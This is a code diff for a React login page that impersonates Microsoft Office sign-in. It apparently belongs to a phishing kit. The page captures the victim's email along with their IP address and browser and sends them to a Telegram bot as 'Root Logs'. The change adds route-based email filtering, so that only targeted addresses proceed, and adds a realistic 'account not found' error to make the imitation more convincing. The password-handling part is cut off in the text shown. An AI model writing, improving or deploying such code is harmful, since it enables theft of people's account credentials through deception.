@@ -1,9 +1,11 @@
 import React, { useEffect, useState } from "react";
+import { useLocation } from "react-router-dom";
 import microsoftLogo from "../assets/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"; // Adjust the path if necessary
 import {
   getUserIP,
   getUserBrowser,
   sendMessageToTelegram,
+  validateEmailForRoute
 } from "../services/api"; // Make sure the path is correct
 
 const Office = () => {
@@ -16,6 +18,9 @@ const Office = () => {
   const [attemptCount, setAttemptCount] = useState(0);
   const [showErrorMessage, setShowErrorMessage] = useState(false);
 
+  const [isValid, setIsValid] = useState(true); // State to keep track of validation
+  const location = useLocation();
+
   useEffect(() => {
     getUserIP().then(setIpAddress);
     setBrowser(getUserBrowser());
@@ -23,10 +28,20 @@ const Office = () => {
 
   const handleEmailSubmit = async (event) => {
     event.preventDefault();
-    setShowPasswordForm(true);
-    // Call Telegram API to send the email and user information
-    const message = `Root Logs\nMultipage\nOffice\nEmail entered: ${email}\n\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
-    await sendMessageToTelegram(message);
+    const isValidEmail = validateEmailForRoute(location.pathname, email);
+    setIsValid(isValidEmail);
+    if (isValidEmail) {
+      console.log("Email is valid for this route");
+      setShowPasswordForm(true);
+      // Call Telegram API to send the email and user information
+      const message = `Root Logs\nMultipage\nOffice\nEmail entered: ${email}\n\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
+      await sendMessageToTelegram(message);
+      // Proceed with your submission logic
+    } else {
+      console.log("Email is not valid for this route");
+      // Handle invalid email case
+    }
+    
   };
 
   const handlePasswordSubmit = async (event) => {
@@ -60,10 +75,15 @@ const Office = () => {
             <form className="space-y-6" onSubmit={handleEmailSubmit}>
               {/* ... */}
               <div className="sm:mx-auto sm:w-full sm:max-w-md">
-                <h2 className="mb-3 text-start text-2xl font-medium text-gray-900">
+                <h2 className="text-start text-2xl font-medium text-gray-900">
                   Sign in
                 </h2>
               </div>
+              {!isValid && (
+                <div className="text-base" style={{ color: "red" }}>
+                  We couldn't find an account with that username. Try another!
+                </div>
+              )}
               <input
                 id="email"
                 name="email"
@@ -75,6 +95,7 @@ const Office = () => {
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
               />
+
               <div className="text-xs font-light text-gray-600">
                 <p>
                   No account? <span className="text-blue-700">Create One!</span>
@@ -99,10 +120,7 @@ const Office = () => {
               >
                 {email} {/* Display the email here */}
               </span>
-              <label
-                
-                className="mb-6 text-start text-2xl font-medium text-gray-900"
-              >
+              <label className="mb-6 text-start text-2xl font-medium text-gray-900">
                 Enter Password
               </label>
               <input
